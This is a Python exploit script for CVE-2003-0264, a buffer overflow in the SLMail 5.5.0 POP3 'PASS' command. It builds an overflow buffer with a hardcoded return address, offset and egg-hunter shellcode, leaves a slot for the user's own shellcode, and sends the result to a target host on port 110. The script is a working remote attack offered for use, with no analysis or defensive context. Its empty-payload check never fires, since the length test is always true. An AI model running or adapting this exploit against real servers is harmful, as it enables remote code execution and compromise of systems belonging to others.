#!/usr/bin/python
# CVE-2003-0264
# Operating Systems Tested:
# 	Windows 7 Ultimate (x86)
# Bad Characters: \x00\x0a\x0d
# EIP Offset: 2606
import argparse
import socket

payload = ""

parser = argparse.ArgumentParser(description = "SLMail 5.5.0 \"PASS\" Exploit")
parser.add_argument("RHOST", help = "Target's IP Address")
arguments = parser.parse_args()
EIP = "\x13\x4d\x4c\x5f"
egg_hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x48\x41\x43\x4b\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
if len(payload) >= 0:
	rhost = arguments.RHOST
	buffer = "HACKHACK" + payload + "\x90" * (2606 - 8 - len(payload)) + EIP + egg_hunter + "\x90" * (2700 - 2606 - 4 - len(egg_hunter))
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("[*] Connecting to " + rhost + " on port 110")
	connection.connect((rhost,110))
	connection.recv(1024)
	print("[*] Sending exploit")
	connection.send('USER username' +'\r\n')
	connection.recv(1024)
	connection.send('PASS ' + buffer + '\r\n')
	connection.close()
	print("[*] Exploit had been sent")
else:
	print("[-] \"payload\" is empty. Please add your shellcode to the \"payload\" variable.")
